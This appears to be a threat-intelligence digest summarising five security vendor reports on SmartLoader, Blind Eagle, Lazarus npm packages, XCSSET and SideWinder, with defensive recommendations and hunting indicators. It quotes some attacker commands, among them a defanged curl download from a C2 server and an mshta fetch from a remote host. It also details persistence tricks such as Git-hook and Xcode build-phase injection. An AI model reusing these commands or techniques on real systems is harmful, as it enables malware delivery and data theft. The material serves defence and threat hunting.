## AI Assisted Fake GitHub Repositories Fuel SmartLoader and LummaStealer Distribution
### Summmary
This article from Trend Micro Trend Research details an ongoing cyber threat campaign that utilizes **fake GitHub repositories with AI-generated content to distribute the SmartLoader malware**, which subsequently delivers the **Lumma Stealer infostealer** and potentially other malicious payloads. The campaign leverages the trusted reputation of GitHub to evade detection and deceives users by disguising malware as legitimate tools such as gaming cheats, cracked software, and system utilities. Upon successful execution, the delivered malware can steal sensitive information, including cryptocurrency wallets, 2FA extensions, and login credentials, potentially leading to identity theft and financial fraud. The threat actors have evolved their tactics from using GitHub file attachments to creating entire repositories, incorporating social engineering and AI-assisted deception.

### Technical Details
![alt text](<images/The Feed 2025-03-12_1.png>)
This campaign demonstrates a notable evolution in tactics by cybercriminals abusing the GitHub platform for malware distribution. Instead of merely hosting malicious files, the attackers are now creating entire **fake GitHub repositories** to appear legitimate. A key aspect of this deception is the heavy use of **AI-generated content** to populate the repositories with convincing README files and documentation, featuring elements like excessive emoji usage, unnatural phrasing, hyperlinked logos, and structured content. These repositories often contain only a README file, with all hyperlinks redirecting to malicious ZIP files concealed within the **Releases section**, making them less conspicuous.

The initial lure involves users searching for "gray-area" tools like game cheats, cracked software, or cryptocurrency utilities. Security researchers on platforms like X/Twitter sometimes share open-source tools hosted on GitHub, and threat actors may impersonate researchers to further this lure. Victims are enticed to download ZIP files (e.g., Release.zip, Software.zip). These ZIP archives contain several components:
*   `lua51.dll`: The LUAJIT runtime interpreter.
*   `luajit.exe`: The Lua loader executable.
*   `userdata.txt`: An obfuscated malicious Lua script.
*   `Launcher.bat`: A batch file designed to execute `luajit.exe` with `userdata.txt` as an argument.

The benign-looking executable and DLL are used to launch the malicious Lua script. This script, the actual malicious payload, is responsible for compromising the victim's system. This technique of using obfuscated Lua scripts within ZIP archives is a recurring tactic observed in previous SmartLoader campaigns. In those earlier campaigns, a batch file (`Compiler.exe`) would load `lua51.dll` and execute the malicious script, establishing a connection to a command-and-control (C&C) server, using obfuscation techniques (Prometheus Obfuscator, ffi library), establishing persistence via scheduled tasks, collecting system information, evading security defenses, and deploying further payloads like CypherIT Loader/Crypter and the Redline infostealer.

The current campaign, while sharing the core technique of obfuscated Lua scripts and batch execution, shows an evolution in delivery infrastructure and lure mechanisms compared to an October 2024 campaign that used fake webpages mimicking software download sites with malicious files hosted on GitHub file attachments.

Once SmartLoader is executed via the Lua script, it proceeds to deliver the Lumma Stealer payload. The loader retrieves a file from GitHub, saves it as `search.exe`, and executes it. This `search.exe` is responsible for dropping necessary files and running an encrypted AutoIt script hidden within Excel files. The execution chain involves creating and executing multiple files in the `%TEMP%` folder using batch scripts, including copying several seemingly benign Excel files into one batch script. It also performs security software discovery commands using `findstr` to identify potential defenses. A misnamed AutoIt interpreter (`Research.com`) is created in the `%TEMP%` folder and used for further execution. Notably, the malware performs browser debugging by launching Microsoft Edge with a remote debugging port enabled. Finally, Lumma Stealer establishes communication with its C&C server at `pasteflawwed[.]world` to exfiltrate stolen data. SmartLoader is also capable of inflating files to approximately 1GB upon loading the payload.

### Countries
Not explicitly mentioned in the provided excerpts.

### Industries
Not explicitly mentioned in the provided excerpts, but the lures targeting gaming cheats, cracked software, and system tools suggest a broad range of potential individual users could be targeted.

### Recommendations
To defend against SmartLoader and similar malware campaigns, individuals and organizations should adopt proactive best practices:
*   **Download software only from official sources**: Avoid third-party sites, torrents, and repositories offering free or cracked software.
*   **Verify repository authenticity**: Check for legitimate contributors, repository history, and signs of AI-generated or suspicious documentation.
*   **Enable security features**: Utilize endpoint security solutions capable of detecting and blocking malicious downloads.
*   **Analyze files before execution**: Employ sandboxing tools to scan unknown files before running them.
*   **Implement network security controls**: Block known malicious GitHub repositories and restrict file downloads from unverified sources.
*   **Monitor for abnormal activity**: Use SIEM tools to detect unauthorized script executions and unusual outbound connections.
*   **Educate employees on social engineering risks**: Conduct security awareness training to prevent falling victim to fake repositories.

## Blind Eagle: …And Justice for All
### Summmary
This report from Check Point Research details ongoing cyber espionage and cybercrime campaigns conducted by the **APT-C-36 group, also known as Blind Eagle**, primarily targeting **Colombian institutions and government entities** since November 2024. The group utilizes **malicious .url files**, often delivered through legitimate file-sharing platforms like Google Drive, Dropbox, GitHub, and Bitbucket, which lead to the deployment of various malware, including a **.NET RAT (likely a variant of PureCrypter)** protected by **HeartCrypt**, and the final-stage payload **Remcos RAT**. These campaigns leverage social engineering tactics and have achieved significant infection rates, with over 1,600 victims in a single campaign around December 2024. While initially adapting a non-exploiting variant of the recently patched **CVE-2024-43451** vulnerability, Blind Eagle continues to evolve its tactics, focusing on persistence and evading antivirus detection, and has shown a preference for targeting the Colombian justice system and other government organizations.

### Technical Details
![alt text](<images/The Feed 2025-03-12_2.png>)
The Blind Eagle attack chain observed in these campaigns typically begins with the delivery of **malicious .url files**. These files are often distributed via **phishing emails containing links to compromised Google Drive or other file-sharing services**. In more recent activity, the group has also been observed distributing payloads through **GitHub** and **Bitbucket**.

The **.url files** used by Blind Eagle were adapted shortly after the patching of **CVE-2024-43451** by Microsoft on November 12, 2024. While the Blind Eagle variant does not exploit the vulnerability to expose NTLMv2 hashes, it **triggers a WebDAV request** in the same uncommon ways as the exploit (right-clicking, deleting, or dragging the file), notifying the attacker that the file was downloaded. On both patched and unpatched systems, **manually clicking the .url file initiates the download of the next-stage payload via another WebDAV request over HTTP (port 80)**, avoiding an initial SMB connection. The User-Agent used for this HTTP connection is "Microsoft-WebDAV-MiniRedir/10.0.19044".

The downloaded executable is often packed using the **Packer-as-a-Service HeartCrypt**. HeartCrypt employs a **.NET RAT** that appears to be a **variant of PureCrypter**. This initial .NET RAT is injected into `csc.exe` and is responsible for gathering system information (username, OS version, process name and architecture, antivirus installed, etc.). It then communicates with a Command and Control (C&C) server to receive a URL for the final-stage payload. The communication involves **serializing data using protobuf** and **encrypting it with AES**. The AES key is derived using the mutex name "mono1234" and a specific salt.

The final-stage payload is the well-known **Remote Access Trojan (RAT) Remcos RAT**. This payload has been observed being downloaded from various sources, including compromised servers initially and later from **GitHub repositories** (specifically the `Oscarito20222/file` and `Oscarito20222/diciembre` repositories) and **Bitbucket repositories**. The threat actors frequently change their C&C servers for Remcos, even though many resolve to the same IP address.

The report also highlights a past operational failure (**OPFail**) in early March 2024, where Blind Eagle inadvertently exposed Personally Identifiable Information (PII) collected from **phishing campaigns impersonating Colombian banks**. This data, containing over 8,000 entries, included usernames, passwords, email addresses, email passwords, and ATM PINs, demonstrating the group's history of both espionage and cybercrime.

Analysis of the **.NET RAT "Remcos Downloader"** reveals it is heavily obfuscated with **NET-Reactor**, employing **string encryption** and **control flow obfuscation**. The unpacking process involves AES decryption and GZIP decompression of an embedded buffer within a .NET packer injected into `csc.exe`. The RAT's configuration, including C&C server and campaign ID, is stored as a base64-encoded string within a decrypted resource. While primarily used as a downloader, the .NET RAT also contains functionalities for downloading payloads to disk, establishing persistence via scheduled tasks, and executing PowerShell scripts.

### Countries
**Colombia**
Other **Latin American countries** (primarily targeted)
**Ukraine** (targeted by the original CVE-2024-43451 exploit attributed to UAC-0194)

### Industries
**Government institutions** (especially Colombian judicial institutions and other government entities)
**Financial organizations** (impersonated in past phishing campaigns)
**Critical infrastructure**
**Private organizations**
**Educational institutions** (targeted in past phishing campaigns)
**Businesses operating in Colombia** (targeted in past phishing campaigns)

### Recommendations
Organizations should implement proactive threat intelligence, advanced security defenses, and continuous monitoring to mitigate the impact of Blind Eagle. Key recommendations include:
*   **Vigilance against phishing campaigns**.
*   Enhanced defenses against **file-based malware delivery**.
*   Monitoring for **unconventional attack techniques**.
*   Implementing **comprehensive security solutions** that provide coverage against various attack tactics, file types, and operating systems.
*   Ensuring systems are **patched against known vulnerabilities** like CVE-2024-43451, although Blind Eagle quickly adapted to a non-exploiting variant.

Check Point Threat Emulation and Harmony Endpoint provide comprehensive coverage against the described attacks and threats.

### Hunting methods
While the report doesn't provide specific hunting queries (like Yara or Sigma rules), the technical details offer several avenues for threat hunting:
*   **Monitor for WebDAV requests** originating from unusual user interactions with `.url` files (right-click, delete, drag).
*   **Inspect network traffic for HTTP requests** with the **User-Agent** "Microsoft-WebDAV-MiniRedir" targeting uncommon destinations after a user interacts with a `.url` file.
*   **Analyze processes for the execution of `csc.exe`** followed by network connections to known Blind Eagle C&C infrastructure.
*   **Look for executables packed with HeartCrypt**.
*   **Monitor for network traffic related to known Remcos RAT C&C servers** and associated botnet names (e.g., redtube).
*   **Investigate connections to file-sharing platforms** (Google Drive, Dropbox, GitHub, Bitbucket) for suspicious file downloads, especially `.url` files or executables.
*   **Track activity related to the GitHub account `Oscarito20222`** and the repositories `file` and `diciembre` for new or modified executable files.
*   **Monitor for processes injecting into `MSBuild.exe` or `InstallUtil.exe`** after connections to known Blind Eagle infrastructure.

## Lazarus Strikes npm Again with New Wave of Malicious Package...
### Summmary
North Korea's **Lazarus Group** has been identified as being behind a new campaign targeting the **npm ecosystem**. This campaign involves **six new malicious packages** designed to compromise developer environments by stealing credentials, extracting cryptocurrency data, and deploying a backdoor. These packages embed **BeaverTail malware** and utilize tactics consistent with previous Lazarus operations. The threat actors employed **typosquatting**, mimicking popular libraries, and created seemingly legitimate **GitHub repositories** for five of the packages to increase their likelihood of being adopted. The malicious packages have been downloaded over **330 times** and remained live on the npm registry at the time of reporting. While definitive attribution is difficult, the observed **TTPs strongly align with Lazarus's known methodology**. The ultimate goal appears to be long-term compromise and embedding within development workflows.

### Technical Details
This recent npm attack attributed to the Lazarus Group exhibits several technical characteristics consistent with their past operations. The campaign involved the deployment of **six new malicious packages**: is-buffer-validator, yoojae-validator, event-handle-package, array-empty-validator, react-event-dependency, and auth-validator. These packages employed **typosquatting**, using names that closely resemble legitimate and trusted libraries to deceive developers. For instance, `is-buffer-validator` mimics the widely used `is-buffer` package.

To appear legitimate, the APT group created and maintained **GitHub repositories for five of the six malicious packages**. This tactic aims to provide a veneer of open-source credibility, increasing the chances of the harmful code being integrated into developer workflows.

The malicious code embedded within these packages utilizes **obfuscation techniques** observed in previous Lazarus campaigns. These techniques include **self-invoking functions, dynamic function constructors, and array shifting** to conceal the true functionality of the malware.

The malware exhibits **cross-platform targeting**, designed to compromise **Windows, macOS, and Linux systems**. Upon execution, the code collects system environment details such as the hostname, operating system, and system directories. It then proceeds to **enumerate browser profiles** to locate and extract sensitive files, including **Login Data from Chrome, Brave, and Firefox**, as well as **keychain archives on macOS**. Furthermore, the malware targets **cryptocurrency wallets**, specifically extracting `id.json` from Solana and `exodus.wallet` from Exodus.

The collected data is then **exfiltrated to a hardcoded Command and Control (C2) server** located at `hxxp://172.86.84[.]38:1224/uploads`. This C2 mechanism and data theft tactics are consistent with Lazarus's prior supply chain compromises.

Beyond data theft, the malicious script also **downloads additional malicious components**, identified as the **InvisibleFerret backdoor**. This secondary payload (SHA256: `6a104f07ab6c5711b6bc8bf6ff956ab8cd597a388002a966e980c5ec9678b5b0`) is downloaded using both `curl` commands and the Node.js `request` module. The downloaded files are typically named `p.zi` or `p2.zip` and are extracted using the `tar -xf` command. This multi-stage deployment strategy, involving the BeaverTail malware and the InvisibleFerret backdoor, aligns with previously documented Lazarus operations.

The threat actors employ **persistence mechanisms** to ensure continued compromise, even if initial stages are detected and removed. The creation or repurposing of GitHub repositories further aids in obscuring their activities and making the operation appear as legitimate open-source development.

**Observed commands (from code snippets):**
*   `curl -Lo "${pFile}" "hxxp://172.86.84[.]38:1224/pdown"`
*   `tar -xf` (used for extracting downloaded zip files)

### Countries
While the source doesn't explicitly state targeted countries, the nature of npm package usage suggests a potentially global impact on developers using these malicious packages. The attribution points towards **North Korea** (Lazarus Group).

### Industries
The primary target of this campaign is the **software development industry**, specifically developers who utilize the **npm package manager** in their workflows. Any organization or individual incorporating these malicious packages into their projects could be affected.

### Recommendations
The report provides several recommendations for organizations to mitigate these types of threats:
*   Implement a **multi-layered approach to detection and defense**.
*   Utilize **automated dependency auditing and code reviews** to identify anomalies in third-party packages, especially those with low download counts or from unverified sources.
*   Conduct **continuous monitoring of unusual dependency changes** to detect malicious updates.
*   **Block outbound connections to known C2 endpoints** to prevent data exfiltration.
*   **Sandbox untrusted code** in controlled environments.
*   Deploy **endpoint protection** to detect suspicious file system or network activities.
*   **Educate development teams** on common typosquatting tactics to promote vigilance when installing new packages.
*   Employ tools like the **Socket GitHub app** for real-time scanning of pull requests to identify malicious dependencies before integration.
*   Integrate the **Socket CLI** into npm installation workflows to detect anomalies before they reach production.
*   Use the **Socket browser extension** to proactively warn users of potential threats upon download or viewing.

### Hunting methods
The technical details and Indicators of Compromise provided in the report can be used for threat hunting:
*   Monitor npm package installations for the presence of the listed **malicious package names**: `is-buffer-validator`, `yoojae-validator`, `event-handle-package`, `array-empty-validator`, `react-event-dependency`, and `auth-validator`.
*   Investigate any usage of npm aliases: `edan0831`, `hottblaze`, `ricardoalexis07`, `alextucker0519`, `elondavid`, and `kevin_tr`.
*   Look for network connections to the identified **C2 server**: `172.86.84[.]38` on ports `80` and `1224`.
*   Monitor for outbound connections to the specific C2 endpoints: `hxxp://172.86.84[.]38:1224/uploads`, `hxxp://172.86.84[.]38:1224/pdown`, and `hxxp://172.86.84[.]38:1224/client/9/902`.
*   Search for files with the SHA256 hash: `6a104f07ab6c5711b6bc8bf6ff956ab8cd597a388002a966e980c5ec9678b5b0`.
*   Monitor for processes executing `curl` or using Node.js `request` to download files from `hxxp://172.86.84[.]38:1224/pdown`.
*   Look for the creation or modification of files named `p.zi` or `p2.zip` in temporary directories (`tmpDir`) followed by the execution of `tar -xf`.
*   Investigate network traffic for data being sent to `hxxp://172.86.84[.]38:1224/uploads`.
*   Monitor for processes attempting to read sensitive files related to browser data (e.g., `Login Data`) and cryptocurrency wallets (e.g., `id.json`, `exodus.wallet`).
*   Correlate the installation of these specific npm packages with subsequent suspicious activity, such as the collection of system information or network connections to the identified C2 infrastructure.

## New XCSSET malware adds new obfuscation, persistence techniques to infect Xcode projects | Microsoft Security Blog
### Summmary
Microsoft Threat Intelligence has discovered a **new variant of the XCSSET malware** targeting **Xcode projects**. This sophisticated macOS malware features **enhanced obfuscation methods**, **updated persistence mechanisms**, and **new infection strategies** compared to its last known variant in 2022. The malware aims to **steal and exfiltrate files and system and user information**, including digital wallet data and notes. It infects Xcode projects, likely spreading through shared project files among developers building Apple or macOS applications. This new variant employs a **modular approach**, **encoded payloads**, **improved error handling**, and extensive use of **scripting languages**, **UNIX commands**, and **legitimate binaries** to maintain a low profile and evade detection. The malware follows a **four-stage infection chain**, with the fourth stage executing various sub-routines. It utilizes techniques such as **hex and Base64 encoding**, **three distinct persistence methods** (zshrc, Dock, Git commits), and a **new infection method for Xcode projects**. Some modules appear to be under development, and its command-and-control (C2) server is active. Microsoft has shared its findings with Apple. The C2 server infrastructure includes domains like bulknames[.]ru. File hashes associated with different stages and modules have been identified.

### Technical Details
The new XCSSET variant employs a **four-stage infection chain**.

**Stage 1:** The initial payload is triggered when a user builds an infected Xcode project. This payload is **obfuscated through three iterations of hex encoding** and then executed via shell. The decoded payload makes a **`curl` request to the C2 server `https[:]//bulknames[.]ru/a`**, piping the response to the shell. This command demonstrates the use of **command-line tools for initial access and C2 communication**.

**Stage 2:** The payload downloaded in the first stage collects the **affected user's device operating system information** and sends it to the C2 server along with a default identifier to download an additional payload, which is then executed by the shell. This stage highlights **system reconnaissance** as an early tactic.

**Stage 3:** This stage involves a **shell script** that first checks if the device's **XProtect version is less than 5287** using the command `"xprotect version"` and reading the `Info.plist` file. It then **stops specific processes** (including SimulatorTrampoline, Terminal, and Finder) and any running `osascript` processes. The script searches for a hidden file `.a` in the home folder, updating it if found or creating it otherwise. It deletes any existing references to `/tmp/l.app` and creates a new one. Subsequently, it downloads another script from the C2 server and saves it as `/tmp/b`. An **AppleScript compiled application** is created using `osacompile` to launch the downloaded `/tmp/b` script. The script then uses `plutil` to **modify the `Info.plist` file** of the AppleScript application, enabling the `LSUIElement` key to **hide the application from the Dock**. Finally, the script runs the application in the background, sleeps, and removes the created application and the `/tmp/b` script. This stage demonstrates techniques for **disabling security tools (XProtect)**, **process termination**, **file system manipulation**, **payload delivery via scripting**, and **persistence via a hidden background application**.

**Stage 4:** The fourth stage involves the execution of the created **AppleScript application**, which runs a shell command. This command passes a **Base64-encoded blob through several iterations of Base64 decoding** to obtain and execute the final script. The decoded script is another AppleScript that first parses the `com.apple.launchservices.secure.plist` file to determine the default browser for `https` URLs. It then fetches various **system information** (macOS version, Safari version, user locale, firewall status, SIP status, CPU information) and sends it to the C2 server. The script **overrides the default `log()` function** to send logs to the C2 server. It checks if the username is "demo" or if the device serial number contains "JV3Q", exiting under these conditions. It then calls the `boot()` function repeatedly with obfuscated module names.

The **`boot()` function** has filters and handlers for different module names. If a module name doesn't pass any filter, the function downloads and launches an AppleScript directly from the C2 server to avoid leaving artifacts. The sub-modules downloaded by the fourth-stage script follow a similar format of **Base64-encoded blobs decoded through multiple iterations** before direct execution.

Observed sub-modules include:
*   **System Information Exfiltration:** Collects and exfiltrates lists of applications, system applications, user-level LaunchAgents, XProtect version, and MRT version.
*   **Browser Extension Discovery:** Searches for and lists installed internet browser extensions by examining predefined folder paths and files (e.g., `prefs.js` for Firefox, `manifest.json` for other browsers), storing the list in `/tmp/out.txt` and uploading it to the C2 server.
*   **Downloader:** Periodically requests a module name from the C2 server (every 120 seconds) and executes it using the `boot()` function if received.
*   **Digital Wallet Extension Discovery:** Retrieves a path list from the C2 server and searches for cryptocurrency digital wallet extensions (e.g., MetaMask, TokenPocket, TronLink, BNB Chain Wallet, Phantom Wallet) based on specific identifiers within browser directories.
*   **Data Archiver:** Archives collected data and sends it to the C2 server.
*   **Persistence Mechanisms:**
    *   **zshrc:** Checks for a `RESTORE_DEFAULT` variable. If "True", it deletes `~/.zshrc_aliases`; otherwise, it retrieves a payload and saves it there. It then ensures `~/.zshrc` exists and appends a payload to execute `~/.zshrc_aliases` upon new shell sessions.
    *   **Dock:** Downloads a signed `dockutil` tool to manage Dock items. It searches for Launchpad, creates a fake Launchpad application in `~/Library/Caches/com.apple.finder/`, and modifies its `Info.plist` to hide it. It then uses `dockutil` to replace the legitimate Launchpad entry with the fake one, ensuring the malicious payload runs when Launchpad is started.
*   **Notes Stealer:** Creates a fake Reminders application in `/Applications/Reminders.app` and a `Notes` folder within it. It creates an AppleScript application to launch a malicious JavaScript payload (`/tmp/.n`) using `osascript`. The JavaScript code connects to the legitimate Notes application, retrieves all notes, saves them as HTML files in the fake Reminders' `Notes` folder, and exfiltrates them. It employs TCC database resets for AppleEvents as a retry mechanism if the `Notes` folder is not created initially.
*   **Launcher Modules (finderModules):** These modules (e.g., triggered with `vectfd_xhh`) check for the presence of Xcode or Git, defaulting to Finder if neither is found. They create a fake application (Xcode, Git, or Finder) in `/Applications/`, modifying its icon and `plist` entries. These fake applications execute a script at `/tmp/.i`, which in turn executes `/tmp/.f` (downloaded by the parent fourth-stage module). They also check TCC permissions and reset the database if necessary.
*   **Xcode Project Infector (dfhsebxzod):** Launched by the launcher module, this module searches for `.xcodeproj` directories and `.zip` files containing "xcodeproj" in the user's home directory (excluding specific folders). It downloads a presumed 7-Zip binary for processing zip files. For each identified project, it searches for `.pbxproj` and uses one of three infection methods (RULE, TARGET, FORCED_STRATEGY) to insert a payload, often using the `TARGET_DEVICE_FAMILY` variable or adding a `PBXShellScriptBuildPhase` with the payload in the `shellScript` key. The payload is generated with random C2 domains and encoding (Base64 or xxd) with 2-5 iterations, consisting of an encoded `curl` request to the C2 server piped to the shell.
*   **Git Commit Infector (jez):** Establishes persistence by adding a payload to the `hooks/pre-commit` file within `.git` directories found in the user's home directory (up to six sub-levels, excluding Movies, Library, Music, and Pictures). If the file exists, it replaces the content; otherwise, it creates the file and writes the payload. The payload generation is similar to the zshrc and Dock persistence methods, ensuring execution upon each Git commit.
*   **Directory Uploader (uhsoxtfd_vostfd):** Currently appears to be under development, with the target folder hardcoded to `~/Desktop/test`. It verifies the folder's existence, checks access permissions, and resets TCC for Desktop, Downloads, and Documents if needed. It then archives the folder (excluding certain files and sizes) and uploads it to a C2 server before deleting the archive.
*   **Command Runner (fpfb):** Executes a predefined command ("ls -la ~/Desktop" currently) and uploads the result to the C2 server.
*   **Specific File Exfiltrator (vectfd):** Retrieves files matching a pattern defined in `INAME_QUERY` (currently "*test.txt") within the user's home directory, excluding certain directories and sizes. It archives the retrieved files, sends the archive to a C2 server, and deletes it.

The malware extensively uses **obfuscation (hex and Base64 encoding, randomized payload generation, obfuscated module names)**, **persistence techniques (zshrc, Dock, Git hooks)**, **masquerading (fake applications)**, and **TCC manipulation**. It leverages **AppleScript and shell scripting** for various tasks.

## SideWinder targets the maritime and nuclear sectors with an updated toolset
### Summmary
This article details the continued activity of the SideWinder APT group throughout the second part of 2024, following up on previous reporting from the first half of the year. The group, known for primarily targeting military and government entities in Pakistan, Sri Lanka, China, and Nepal, has aggressively expanded its focus to include government entities, logistics companies, and **maritime infrastructures in South and Southeast Asia, the Middle East, and Africa**. A **significant increase in attacks against maritime infrastructures and logistics companies** was observed, with initial focus on Djibouti, followed by a shift to other entities in Asia and a strong interest in targets within Egypt. Additionally, attacks indicated a **specific interest in nuclear power plants and nuclear energy in South Asia** and further expansion into new countries, especially in Africa. SideWinder continuously updates its toolset, infrastructure, and techniques to evade detection. The **infection vector remains spear-phishing emails with malicious DOCX attachments** exploiting the **CVE-2017-11882 vulnerability** to deploy the "Backdoor Loader" which then loads the "StealerBot" post-exploitation toolkit. The group demonstrates rapid response to security software detections by generating new malware versions, often within five hours, and modifies persistence mechanisms and file names. The targeted documents often concern governmental decisions, diplomatic issues, maritime infrastructure, port authorities, and nuclear energy. Generic topics are also used as lures.

### Technical Details
![alt text](<images/The Feed 2025-03-12_3.png>)
SideWinder's attack chain begins with **spear-phishing emails containing malicious DOCX files**. These documents utilize the **remote template injection technique** to download a **malicious RTF file** from a server controlled by the attacker. The RTF file exploits the **CVE-2017-11882 vulnerability** to execute a malicious shellcode, initiating a multi-stage infection process.

The shellcode executes **embedded JavaScript code** that invokes the `mshtml.RunHTMLApplication` function. In the updated toolset, the JavaScript runs the **Windows utility `mshta.exe`** to retrieve additional code from a remote server. An example command observed is: `mshta.exe   https://dgtk.depo-govpk[.]com/19263687/trui`.

The downloaded HTA file contains **heavily obfuscated JavaScript** that loads the **"Downloader Module"** into memory. This JavaScript loader operates in two stages. The **first stage** decodes strings using a substitution algorithm and checks the installed RAM, terminating if it's less than 950 MB. The **second stage** enumerates subfolders in `Windows%\Microsoft.NET\Framework\` to determine the installed .NET framework version and sets the `COMPLUS_Version` environment variable accordingly. Finally, it decodes and loads the **Downloader Module**, which is embedded as a base64-encoded .NET serialized stream.

The **Downloader Module**, a .NET library, collects information about installed security solutions and downloads the **"Module Installer"**. A new version of `app.dll` (Downloader Module) employs a more sophisticated method for identifying security solutions. Instead of a simple WMI query, it now uses a different WMI to collect the antivirus name and its "productState". Additionally, it compares running process names against an embedded dictionary of 137 process names associated with popular security solutions. The WMI query is only executed if no Kaspersky processes are running.

The infection chain culminates in the installation of **"Backdoor Loader"**, a library sideloaded using legitimate and signed applications. Its primary function is to load the **"StealerBot"** implant into memory. While "StealerBot" remained unchanged, numerous variants of "Backdoor Loader" have been distributed. Previously, it was designed to be loaded by `propsys.dll` or `vsstrace.dll`. Recent campaigns have seen variants distributed under names such as `JetCfg.dll`, `policymanager.dll`, `winmm.dll`, `xmllite.dll`, `dcntel.dll`, and `UxTheme.dll`. These newer variants feature enhanced anti-analysis code and extensive use of Control Flow Flattening to evade detection. A new **C++ version of "Backdoor Loader"** was also observed, with the same core logic as the .NET variants but lacking anti-analysis techniques. Notably, many C++ samples were tailored to specific targets, configured to load the second stage from a specific file path embedded in the code, including the user's name (e.g., `C:\Users\[REDACTED]\AppData\Roaming\valgrind\[REDACTED FILE NAME].[REDACTED EXTENSION]`). This suggests manual deployment after initial compromise.

SideWinder actively monitors detections of its tools and responds by generating new and modified versions, often within five hours. They also adapt their techniques for maintaining persistence and loading components and change the names and paths of malicious files.

Observed commands include the use of `mshta.exe` to download remote HTA files containing malicious JavaScript. The JavaScript then loads further modules into memory. The Downloader Module uses WMI queries to gather information about installed security solutions. The Backdoor Loader is sideloaded by various legitimate applications.
